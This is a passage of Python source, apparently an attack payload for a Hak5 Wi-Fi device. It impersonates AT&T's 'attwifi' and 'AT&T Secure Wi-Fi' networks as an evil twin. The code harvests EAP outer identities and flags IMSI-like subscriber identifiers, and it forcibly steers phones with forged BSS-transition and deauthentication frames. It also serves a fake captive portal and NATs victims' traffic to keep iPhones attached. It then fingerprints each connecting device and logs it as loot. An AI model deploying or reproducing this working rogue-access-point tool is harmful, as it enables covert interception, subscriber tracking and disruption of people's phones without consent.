    ob = bss_bssid(AP_OPEN)
    args = [target_mac]
    if ob:
        args += ["neighbor=" + ob, "pref=1"]
    args += [f"disassoc_timer={disassoc_timer}", f"valid_int={valid_int}",
             "abridged=1"]
    out = hostapd_cli(AP_ENT, "bss_tm_req", *args)
    return ("FAIL" not in out.upper()), (out or "(sent)")


def deauth_ent(target_mac):
    out = hostapd_cli(AP_ENT, "deauthenticate", target_mac)
    return ("FAIL" not in out.upper()), (out or "(sent)")


def steer_station(mac, args, log_fp):
    res = []
    if args.steer_mode in ("btm", "both"):
        ok_n, _ = add_neighbor_for_open(mac)
        ok_b, _ = send_btm(mac, args.disassoc_timer)
        res.append(f"neighbor={'ok' if ok_n else 'FAIL'} btm={'ok' if ok_b else 'FAIL'}")
    if args.steer_mode in ("deauth", "both"):
        ok_d, _ = deauth_ent(mac)
        res.append(f"deauth={'ok' if ok_d else 'FAIL'}")
    return " | ".join(res) if res else "(steer off)"


# ---------------------------------------------------------------------------
# pseudonym capture
# ---------------------------------------------------------------------------
def parse_usernames(logfile):
    users = []
    if not os.path.exists(logfile):
        return users
    with open(logfile) as f:
        for line in f:
            if "username=" not in line:
                continue
            try:
                q = line.split("username=", 1)[1].split("'")[1]
                if q and q not in users:
                    users.append(q)
            except Exception:
                pass
    return users


def look_like_imsi(u):
    core = u.split("@")[0]
    core = core[1:] if core[:1] in ("0", "1") else core
    return core.isdigit() and 10 <= len(core) <= 16


# ---------------------------------------------------------------------------
# uplink preservation (the phone needs real internet or iOS drops the network)
# ---------------------------------------------------------------------------
# Bringing the APs up on phy0 knocks the client-WiFi uplink off its DHCP lease;
# the interface re-associates but never gets an IPv4/default route back, so
# downstream clients have no internet and iOS disconnects. We snapshot the
# uplink's address/prefix/gateway BEFORE the radio churn and re-apply it
# statically afterwards.
_UPLINK_SNAP = {}


def snapshot_uplink(log_fp):
    """Record the current uplink IP/prefix/gateway so we can restore it."""
    up = uplink_iface()
    if not up or up in ("br-lan", "br-att"):
        log("[net] no uplink to snapshot (phone may have no internet)", log_fp)
        return
    addr = shell_out(f"ip -o -4 addr show {up} 2>/dev/null | awk '{{print $4}}' | head -1")
    gw = shell_out(f"ip route show default 2>/dev/null | awk '/via/{{print $3}}' | head -1")
    if addr:
        _UPLINK_SNAP["iface"] = up
        _UPLINK_SNAP["addr"] = addr            # e.g. 10.0.163.222/16
        _UPLINK_SNAP["gw"] = gw
        log(f"[net] snapshot uplink {up} addr={addr} gw={gw}", log_fp)


def reapply_uplink(log_fp):
    """Re-apply the snapshotted uplink address if it has no default route."""
    up = _UPLINK_SNAP.get("iface", "wlan0cli")
    if not _UPLINK_SNAP.get("addr"):
        return False
    if uplink_iface() not in ("", None) and uplink_iface() not in ("br-lan", "br-att"):
        return True
    addr = _UPLINK_SNAP["addr"]
    gw = _UPLINK_SNAP.get("gw", "")
    log(f"[net] re-applying static uplink {up} {addr} gw={gw}", log_fp)
    shell_out(f"killall udhcpc 2>/dev/null; true")
    shell_out(f"ip addr flush dev {up} 2>/dev/null; "
              f"ip addr add {addr} dev {up} 2>/dev/null; "
              f"ip link set {up} up 2>/dev/null; true")
    if gw:
        shell_out(f"ip route replace default via {gw} dev {up} 2>/dev/null; true")
    return bool(uplink_iface())


def inject_hold_station(iface=AP_OPEN, log_fp=None):
    """Guarantee the AP never deauths an idle client.

    hostapd-sh omits `ap_max_inactivity` when we set max_inactivity=0, so the
    running hostapd falls back to its 300s default and drops the iPhone while
    it sits in the captive-portal flow. We patch the generated hostapd config
    to add an explicit `ap_max_inactivity=0` (disable) to the BSS block, then
    SIGHUP hostapd so it re-reads. Re-applied after every wifi reload.
    """
    conf = "/var/run/hostapd-phy0.conf"
    if not os.path.exists(conf):
        return False
    try:
        with open(conf) as f:
            lines = f.readlines()
    except OSError:
        return False

    # find the interface=/bss= block for iface and insert ap_max_inactivity=0
    out = []
    in_block = False
    inserted = False
    blk_re_matches = lambda l: (l.startswith("interface=") or l.startswith("bss="))
    for i, line in enumerate(lines):
        if blk_re_matches(line):
            in_block = line.strip().endswith("=" + iface)
        out.append(line)
        # insert right after the block's ssid line if present, else after header
        if in_block and not inserted and line.startswith("ssid="):
            out.append("ap_max_inactivity=0\n")
            inserted = True
    if not inserted:
        # fall back: drop it right after the interface= line
        out = []
        for line in lines:
            out.append(line)
            if line.strip() == f"interface={iface}":
                out.append("ap_max_inactivity=0\n")
                inserted = True
    if not inserted:
        return False
    try:
        with open(conf, "w") as f:
            f.writelines(out)
    except OSError:
        return False
    shell_out("killall -HUP hostapd 2>/dev/null; true")
    if log_fp:
        log(f"[hold] injected ap_max_inactivity=0 into {iface} block", log_fp)
    return True


# ---------------------------------------------------------------------------
# run loop
# ---------------------------------------------------------------------------
def normalize_wireless(log_fp):
    """Reset any leftover lure vif state to factory BEFORE we snapshot it.

    An interrupted previous run can leave /etc/config/wireless with
    wlan0open=attwifi (enabled) and radio0.macaddr_base set -- which means the
    Pager keeps broadcasting `attwifi` from its own hostapd outside the
    payload (no WISPr/DNS/NAT), poisoning iOS auto-join. If we snapshotted that
    we would restore it on cleanup and perpetuate the problem. Detect and
    normalize it first so the backup (and the restored state) is clean.
    """
    dirty = False
    if shell_out("uci -q get wireless.wlan0open.ssid 2>/dev/null") in ("attwifi", SSID_SETUP):
        uci_set("wireless.wlan0open.ssid", "pager-open")
        uci_set("wireless.wlan0open.disabled", "1")
        for k in ("encryption", "hidden", "skip_inactivity_poll",
                  "disassoc_low_ack", "max_inactivity", "ieee80211k",
                  "bss_transition", "rrm_neighbor_report", "vendor_elements"):
            uci_del(f"wireless.wlan0open.{k}")
        dirty = True
    if shell_out("uci -q get wireless.wlan0wpa.ssid 2>/dev/null") == "AT&T Secure Wi-Fi":
        uci_set("wireless.wlan0wpa.ssid", "pager-wpa")
        uci_set("wireless.wlan0wpa.disabled", "1")
        dirty = True
    if shell_out("uci -q get wireless.radio0.macaddr_base 2>/dev/null"):
        uci_del("wireless.radio0.macaddr_base")
        uci_del("wireless.radio0.num_global_macaddr")
        dirty = True
    if dirty:
        uci_commit("wireless")
        log("[normalize] reset leftover lure vifs to factory before backup", log_fp)


def recover_stale_state(log_fp):
    """Restore persistent backups left by an interrupted run (hard kill or
    reboot mid-run), so we start from a clean slate instead of stacking
    changes. No-op when there is nothing stale."""
    restored = False
    if os.path.exists(WIRELESS_BAK):
        subprocess.run(["cp", WIRELESS_BAK, "/etc/config/wireless"], check=False)
        os.remove(WIRELESS_BAK)
        restored = True
    if os.path.exists(PINEAP_BAK):
        subprocess.run(["cp", PINEAP_BAK, "/etc/config/pineapd"], check=False)
        os.remove(PINEAP_BAK)
        restored = True
    if os.path.exists(RADIO_MAC_BAK):
        try:
            with open(RADIO_MAC_BAK) as f:
                orig = f.read().strip()
            if orig:
                shell_out(f"echo {orig} > /sys/class/ieee80211/phy0/macaddress")
        except OSError:
            pass
        os.remove(RADIO_MAC_BAK)
        restored = True
    if restored:
        log("[recover] restored stale backups from a previous interrupted run", log_fp)
        wpad_swap("stock", log_fp)
        shell_out("wifi reload >/dev/null 2>&1; true")
        shell_out("/etc/init.d/pineapd restart >/dev/null 2>&1; true")


def run(args, log_fp):
    # Clean up any state left by a previous interrupted run BEFORE snapshotting
    # the uplink (the recovery may do a wifi reload).
    recover_stale_state(log_fp)
    assert_safe_shell()
    # capture the uplink's current address BEFORE we touch the radio
    snapshot_uplink(log_fp)
    # The Passpoint lure (Hotspot2.0/Interworking IEs + the 802.11k/v control
    # commands) needs wpad-wolfssl. The open-only path works on the factory
    # wpad, so skip the swap entirely to avoid the extra radio churn that
    # knocks wlan0cli off.
    if args.enterprise:
        if not wpad_swap("wolfssl", log_fp):
            log("[FATAL] wpad-wolfssl unavailable", log_fp)
            return 1

    # Reset any leftover lure vifs to factory so the backup we take (and thus
    # what cleanup restores) is clean, not a polluted previous-run state.
    normalize_wireless(log_fp)

    backup_file("/etc/config/wireless", WIRELESS_BAK)
    if os.path.exists("/sys/class/ieee80211/phy0/macaddress"):
        backup_file("/sys/class/ieee80211/phy0/macaddress", RADIO_MAC_BAK)

    # bring the radio base back to the factory universal MAC first
    shell_out(f"echo {RADIO_BASE} > /sys/class/ieee80211/phy0/macaddress")

    # PineAP must not beacon competing `attwifi` BSSIDs while the lure is up.
    disable_pineap(log_fp)

    set_radio_macs(log_fp)
    configure_open_bss(log_fp)
    if args.enterprise:
        configure_ent_bss(log_fp)
    # AP and STA share phy0: follow the client-mode uplink's channel so the
    # AP bring-up does not drag the STA off a different network.
    follow_uplink_channel(log_fp)
    stop_pineapd()
    wifi_reload()

    if not verify_bss_up(AP_OPEN, timeout=90):
        log("[FATAL] open attwifi BSS did not come up", log_fp)
        return 1
    if args.enterprise and not verify_bss_up(AP_ENT, timeout=90):
        log("[WARN] enterprise (Passpoint) BSS did not come up", log_fp)
    time.sleep(2)

    # The AP bring-up (wpad restart + wifi reload) shares phy0 with the
    # wlan0cli uplink and often knocks the uplink offline. Wait for it to
    # reassociate so the phone gets real internet (otherwise iOS drops us).
    restore_uplink(log_fp)

    # Ensure the AP never deauths an idle client (the iPhone sits idle in the
    # captive-portal flow and would otherwise be dropped ~10s in).
    inject_hold_station(AP_OPEN, log_fp)
    if args.enterprise:
        inject_hold_station(AP_ENT, log_fp)

    log(f"[bss] setup {SSID_SETUP!r:18} {AP_OPEN} bssid={bss_bssid(AP_OPEN)}", log_fp)
    if args.enterprise:
        log(f"[bss] {SSID_ENT!r:22} {AP_ENT} bssid={bss_bssid(AP_ENT)}", log_fp)

    # captive portal / DHCP for the open twin.
    #
    # DEFAULT is --no-isolate: wlan0open stays a br-lan member so the Pager's
    # own dnsmasq (172.16.52.1) hands the phone an IP and our captive override
    # points captive.apple.com at a reachable address. The isolate path
    # (dedicated br-att) is available but flaky on this firmware because the
    # `wifi reload`/`iw set channel` that follow can re-bridge wlan0open back
    # to br-lan; when that happens the phone sees no DHCP and spins forever.
    if args.isolate:
        # Re-assert bridge membership AFTER the radio has fully settled.
        shell_out(f"{ISOLATE_SCRIPT} up")
        server_ip = "192.168.99.1"
        dhp = subprocess.Popen(
            [sys.executable or "python3", DHCPD_SCRIPT, server_ip],
            stdout=open(os.path.join(args.run_dir, "dhcpd.log"), "a", buffering=1),
            stderr=subprocess.STDOUT)
        args.dhcp_pid = dhp.pid
        time.sleep(1)
        # sanity: warn if wlan0open is not actually on br-att
        master = shell_out("ip link show wlan0open 2>/dev/null | grep -o 'master [a-z0-9-]*'")
        if "br-att" not in master:
            log(f"[warn] wlan0open not on br-att (got {master!r}); DHCP may fail",
                log_fp)
    else:
        server_ip = "172.16.52.1"
    install_dnsmasq_captive(server_ip, log_fp)

    # Give the phone's network real internet (NAT out the uplink). Without this
    # iOS marks the network "no internet" and disconnects after ~10-30s.
    ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)
    ensure_dns_fallback(log_fp)

    # IE-221 OUIs on the open attwifi (legacy hotspot signature)
    shell_out(f"{sys.executable or 'python3'} {IE221_SCRIPT} "
              f"--ifname {AP_OPEN} --conf /var/run/hostapd-phy0.conf")
    shell_out("killall -HUP hostapd 2>/dev/null; true")
    time.sleep(1)

    # RADIUS on the enterprise BSS -> pseudonym capture + stall (only when the
    # Passpoint lure is enabled).
    radius = None
    if args.enterprise:
        radius_log = os.path.join(args.run_dir, "radius.log")
        radius = subprocess.Popen(
            [sys.executable or "python3", RADIUS_SCRIPT, "--bind", "127.0.0.1", "--port", "1812",
             "--secret", RADIUS_SECRET, "--mode", args.radius_mode,
             "--log", radius_log],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log(f"[radius] PID={radius.pid} mode={args.radius_mode}", log_fp)

    # WISPr portal on the open twin
    args.server_ip = server_ip
    wispr = start_wispr(args, server_ip, log_fp)

    # Captive stack is up (DNS override + NAT + WISPr). ONLY NOW flip the live
    # SSID to `attwifi`, so an iPhone never auto-joins a half-configured AP and
    # disables auto-join.
    time.sleep(2)
    activate_open_ssid(log_fp)

    loop(args, log_fp, radius, wispr)
    return 0


def start_wispr(args, server_ip, log_fp):
    w = subprocess.Popen(
        [sys.executable or "python3", WISPR_SCRIPT, "--port", str(WISPR_PORT),
         "--log", os.path.join(args.run_dir, "wispr.log"),
         "--server-ip", server_ip, "--wispr-mode", "apple-success"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"[wispr] PID={w.pid}", log_fp)
    return w


# ---------------------------------------------------------------------------
# connect-time alert (self-contained; the Pager's native alert bus needs
# PineAP client tracking, which ATT-Open-Steer intentionally disables so PineAP
# does not beacon competing `attwifi` BSSIDs. So we detect + alert ourselves.)
# ---------------------------------------------------------------------------
# iOS-only Bonjour services. macOS advertises _apple-mobdev2/_companion-link/
# _asquic too, so ONLY _remotepairing, or an _apple-mobdev2 instance that embeds
# the client's own MAC, is treated as iPhone/iPad.
_APPLE_SVCS = {"_companion-link._tcp", "_apple-mobdev2._tcp",
               "_remotepairing._tcp", "_asquic._udp",
               "_airplay._tcp", "_raop._tcp"}
_IPHONE_PORTS = [62078, 49152, 49153, 49154, 49155, 49156, 8770]


def lease_field(mac, n):
    for line in shell_out("cat /tmp/dhcp.leases 2>/dev/null").splitlines():
        f = line.split()
        if len(f) >= 4 and f[1].lower() == mac.lower():
            return f[n - 1]
    return ""


def vendor_for(mac):
    oui = mac.lower().split(":")[0:3]
    oui = ":".join(oui)
    if oui == "00:13:37":
        return "Hak5"
    if os.path.exists("/lib/hak5/oui.txt"):
        for line in shell_out(f"grep -i '^{oui}' /lib/hak5/oui.txt 2>/dev/null").splitlines():
            parts = line.split("\t")
            if len(parts) >= 2:
                return parts[1].strip()
    return ""


def is_random_mac(mac):
    try:
        return (int(mac.split(":")[0], 16) & 2) != 0
    except Exception:
        return False


def port_open(ip, port, timeout=2):
    if not ip or ip == "-":
        return False
    r = subprocess.run(f"timeout 3 nc -z -w{timeout} {ip} {port}",
                       shell=True, capture_output=True)
    return r.returncode == 0


def mdns_device(ip, maclc):
    """Return (apple, iphone, name) for the device matching ip/mac via umdns.

    Parses `ubus call umdns browse` for records whose ipv4 == ip, or whose
    _apple-mobdev2 instance starts with the client MAC. Mirrors the shell
    alert payload's classifier.
    """
    out = shell_out("timeout 4 ubus call umdns browse 2>/dev/null")
    if not out:
        return ("no", "no", "")
    svc = inst = host = ""
    apple = iphone = False
    best, bestscore = "", 99
    rec_mac = rec_ip = False
    for line in out.splitlines():
        s = line.strip()
        if s.startswith('"_') and s.endswith('": {'):
            svc = s.strip('": {')
            inst = host = ""
            rec_mac = rec_ip = False
        elif s.endswith('": {') and s.startswith('"'):
            inst = s.rstrip('": {').lstrip('"')
            host = ""
            rec_mac = rec_ip = False
            if svc == "_apple-mobdev2._tcp" and maclc and inst.lower().startswith(maclc):
                rec_mac = True
        elif s.startswith('"host"'):
            host = s.split(':', 1)[1].strip().strip(',').strip('"')
            if host.endswith(".local"):
                host = host[:-6]
        elif s.startswith('"ipv4"'):
            tip = s.split(':', 1)[1].strip().strip(',').strip('"')
            if tip == ip:
                rec_ip = True
            if not (rec_ip or rec_mac):
                continue
            if svc in _APPLE_SVCS:
                apple = True
            if svc == "_remotepairing._tcp" or (svc == "_apple-mobdev2._tcp" and rec_mac):
                iphone = True
            name, score = "", 4
            if svc == "_companion-link._tcp":
                name, score = inst, 1
            elif svc in ("_airplay._tcp", "_raop._tcp"):
                name = inst.split("@")[-1]
                score = 2
            elif svc == "_apple-mobdev2._tcp":
                name = inst.split("@")[-1]
                name = name.split("-supportsRP")[0]
                score = 3
            if name in ("", "android", "Android"):
                name = host or inst
            if name and name.lower() != "android" and score < bestscore:
                best, bestscore = name, score
    return ("yes" if apple else "no", "yes" if iphone else "no", best)


def iphone_probe(ip):
    for p in _IPHONE_PORTS:
        if port_open(ip, p):
            return "yes"
    return "no"


def alert_connect(mac, ip, log_fp, rssi=""):
    """Best-effort identity for a device that just joined `attwifi`, then ALERT."""
    maclc = mac.lower()
    if not ip or ip == "-":
        for _ in range(10):
            ip = lease_field(mac, 3)
            if ip:
                break
            time.sleep(1)
    ip = ip or "-"

    apple, iphone, name = mdns_device(ip, maclc)
    for _ in range(20):
        if apple == "yes" and name:
            break
        time.sleep(1)
        shell_out("ubus call umdns update >/dev/null 2>&1")
        apple, iphone, name = mdns_device(ip, maclc)

    dh = lease_field(mac, 4)
    if dh == "*":
        dh = ""
    if not name and dh:
        name = dh
    if not name:
        name = vendor_for(mac)

    man = vendor_for(mac)
    if man == "Hak5":
        man = ""
    if iphone != "yes" and apple != "yes":
        iphone = iphone_probe(ip)
    if iphone == "yes":
        man = man or "iPhone"
    elif apple == "yes":
        man = man or "Apple"

    if iphone == "yes" and (not name or name.startswith("fe80") or name.lower() == "android"):
        name = "iPhone"
    if not name:
        name = "Apple device" if apple == "yes" else (
            "random MAC" if is_random_mac(mac) else "unknown")
    man = man or "Unknown"
    maclabel = "MAC(R)" if is_random_mac(mac) else "MAC"
    # Normalise the raw `iw` line ("signal:  -46 [-50, -47] dBm") to just dBm.
    m = re.search(r"signal:\s*(-?\d+)", rssi)
    rssi = f"{m.group(1)} dBm" if m else (rssi or "?")

    tag = " (iPhone)" if iphone == "yes" else ""
    log(f"[alert] {name} {mac} {ip} man={man} iphone={iphone} rssi={rssi}", log_fp)
    shell_out(f"LOG green 'attwifi: {name} ({mac})' 2>/dev/null")
    alert_txt = (f"attwifi connect!{tag}\\n\\n Dev Name: {name}\\n"
                 f" {maclabel}: {mac}\\n IP: {ip}\\n SSID: attwifi (matched)\\n"
                 f" man: {man}\\n signal: {rssi}")
    subprocess.run(["ALERT", alert_txt], check=False)

    # Loot: everything the alert shows, plus a greppable RSSI field.
    loot = os.path.join(LOG_DIR, datetime.now().strftime("%Y%m%d-attwifi-connect.log"))
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(loot, "a") as f:
            f.write(f"{ts()} | Dev Name: {name} | {maclabel}: {mac} | "
                    f"IP: {ip} | SSID: attwifi | man: {man} | signal: {rssi} | "
                    f"iPhone: {iphone}\n")
    except OSError:
        pass
    return name, man, iphone


def loop(args, log_fp, radius, wispr):
    log("[loop] waiting for iPhone", log_fp)
    seen_users = []
    steered = {}
    landed = set()
    alerted = set()
    started = time.time()
    last_status = 0
    last_steer = 0

    while True:
        time.sleep(1)
        now = time.time()

        # pseudonym capture
        for u in parse_usernames(os.path.join(args.run_dir, "radius.log")):
            if u not in seen_users:
                seen_users.append(u)
                flag = " [IMSI-LIKE]" if look_like_imsi(u) else ""
                log(f"[pseudonym] CAPTURED outer-id: {u!r}{flag}", log_fp)
                shell_out(f"LOG green 'pseudonym: {u}' 2>/dev/null")

        # steering (optional; only meaningful with the Passpoint lure up)
        if (args.enterprise and args.steer_mode != "off"
                and (now - last_steer) >= args.steer_interval):
            for mac in stations(AP_ENT):
                n = steered.get(mac, 0)
                if n >= args.max_steer_attempts:
                    continue
                if not args.steer_always and not seen_users:
                    continue
                if n == 0 and (now - started) < args.steer_after:
                    continue
                msg = steer_station(mac, args, log_fp)
                steered[mac] = n + 1
                log(f"[steer] {mac} #{n+1} mode={args.steer_mode} | {msg}", log_fp)
            if stations(AP_ENT):
                last_steer = now

        # devices on the open twin: log a landing once per MAC, but ALERT on
        # EVERY connect (whenever a MAC newly appears after being absent).
        present = set(stations(AP_OPEN))
        for mac in present:
            st = shell_out(f"iw dev {AP_OPEN} station get {mac} 2>/dev/null")
            rssi = next((l.strip() for l in st.splitlines() if "signal:" in l), "")
            if mac not in landed:
                landed.add(mac)
                log(f"[landed] {mac} on OPEN {SSID_OPEN!r} {rssi}", log_fp)
                shell_out(f"LOG green 'landed: {mac}' 2>/dev/null")
            if mac not in alerted:
                alerted.add(mac)
                try:
                    alert_connect(mac, lease_field(mac, 3), log_fp, rssi)
                except Exception as e:
                    log(f"[alert] error: {e}", log_fp)
        # forget departed MACs so a reconnect alerts again
        for mac in list(alerted):
            if mac not in present:
                alerted.discard(mac)

        if now - last_status > 30:
            last_status = now
            # self-heal: (re)install NAT/forward rules (also re-applies if the
            # client-mode uplink changed), and re-apply the uplink address if
            # it flapped.
            ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)
            if uplink_iface() in ("", None, "br-lan", "br-att"):
                reapply_uplink(log_fp)
            log(f"[status] ent_stas={len(stations(AP_ENT))} "
                f"open_stas={len(stations(AP_OPEN))} steered={len(steered)} "
                f"landed={len(landed)} pseudonyms={len(seen_users)} "
                f"uplink={uplink_iface()}", log_fp)

        if radius is not None and radius.poll() is not None:
            log("[loop] radius exited; stopping", log_fp)
            break
        if wispr.poll() is not None:
            log("[loop] wispr exited; restarting", log_fp)
            wispr = start_wispr(args, args.server_ip, log_fp)


# ---------------------------------------------------------------------------
# cleanup
# ---------------------------------------------------------------------------
_cleanup_done = [False]


def cleanup(args, log_fp):
    if _cleanup_done[0]:
        return
    _cleanup_done[0] = True
    log("[cleanup] starting", log_fp)

    for pat in ("radius-reject[.]py", "v28_dhcpd[.]py", "v28_wispr[.]py"):
        kill_matching(pat, log_fp)
    time.sleep(1)

    remove_dnsmasq_captive(log_fp)
    shell_out(f"{ISOLATE_SCRIPT} down", check=False)

    if os.path.exists(RADIO_MAC_BAK):
        with open(RADIO_MAC_BAK) as f:
            orig = f.read().strip()
        if orig:
            shell_out(f"echo {orig} > /sys/class/ieee80211/phy0/macaddress")
        os.remove(RADIO_MAC_BAK)

    if os.path.exists(WIRELESS_BAK):
        subprocess.run(["cp", WIRELESS_BAK, "/etc/config/wireless"], check=False)
        os.remove(WIRELESS_BAK)
        log("[cleanup] restored /etc/config/wireless", log_fp)

    shell_out("hostapd_cli -p /var/run/hostapd -i wlan0wpa remove_neighbor "
              "00:00:00:00:00:00 2>/dev/null; true")
    # Drop the NAT/forward rules we may have added (reload regenerates fw4).
    shell_out("/etc/init.d/firewall reload >/dev/null 2>&1; true")
    wifi_reload()
    wpad_swap("stock", log_fp)
    restore_pineap(log_fp)
    start_pineapd()
    # Clear our PID file only if it still points at us (a newer run may have
    # started while we were tearing down).
    try:
        with open("/tmp/att-open-steer.pid") as pf:
            if pf.read().strip() == str(os.getpid()):
                os.remove("/tmp/att-open-steer.pid")
    except OSError:
        pass
    log("[cleanup] done", log_fp)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--isolate", dest="isolate", action="store_true", default=False,
                   help="put wlan0open on a dedicated br-att (192.168.99.0/24); "
                        "default is no-isolate (phone on br-lan with the Pager's "
                        "dnsmasq)")
    p.add_argument("--no-isolate", dest="isolate", action="store_false")
    p.add_argument("--no-enterprise", dest="enterprise", action="store_false",
                   default=True,
                   help="open-only: skip the Passpoint enterprise lure (no "
                        "pseudonym capture; single open attwifi BSS on the "
                        "factory wpad, no steering)")
    p.add_argument("--steer-mode", default="btm",
                   choices=["btm", "deauth", "both", "off"])
    p.add_argument("--steer-always", action="store_true")
    p.add_argument("--steer-after", type=int, default=20)
    p.add_argument("--steer-interval", type=int, default=8)
    p.add_argument("--disassoc-timer", type=int, default=5)
    p.add_argument("--max-steer-attempts", type=int, default=6)
    p.add_argument("--radius-mode", default="broken",
                   choices=["broken", "log-only", "reject", "accept", "sweep"])
    p.add_argument("--loot-dir", default=LOG_DIR)
    p.add_argument("--force", action="store_true")
    args = p.parse_args()

    run_id = datetime.now().strftime("%Y%m%d-%H%M%S")
    args.run_dir = os.path.join(args.loot_dir, f"run-{run_id}")
    os.makedirs(args.run_dir, exist_ok=True)
    os.makedirs(STATE_DIR, exist_ok=True)
    # Record our PID so the launcher/toggle can find and stop this exact run.
    try:
        with open("/tmp/att-open-steer.pid", "w") as pf:
            pf.write(str(os.getpid()))
    except OSError:
        pass
    log_fp = open(os.path.join(args.run_dir, "run.log"), "a", buffering=1)
    log(f"att-open-steer starting isolate={args.isolate} "
        f"enterprise={args.enterprise} steer-mode={args.steer_mode} "
        f"radius-mode={args.radius_mode}", log_fp)

    if not args.force:
        try:
            assert_safe_shell()
        except SystemExit:
            log("[FATAL] SSH-source check failed", log_fp)
            log_fp.close()
            sys.exit(2)

    def _on_signal(signum, frame):
        log(f"[signal] {signum}", log_fp)
        # A second signal (the launcher signals both the PID file and a pgrep
        # match) must NOT re-enter the handler and abort the in-progress
        # restore. Ignore any signal once cleanup has begun.
        if _cleanup_done[0]:
            return
        cleanup(args, log_fp)
        sys.exit(0)

    signal.signal(signal.SIGINT, _on_signal)
    signal.signal(signal.SIGTERM, _on_signal)
    signal.signal(signal.SIGHUP, _on_signal)
    atexit.register(lambda: cleanup(args, log_fp))

    rc = 0
    try:
        rc = run(args, log_fp)
    except Exception as e:
        log(f"[fatal] {e}", log_fp)
        rc = 1
    finally:
        cleanup(args, log_fp)
        log_fp.close()
    return rc


if __name__ == "__main__":
    sys.exit(main())
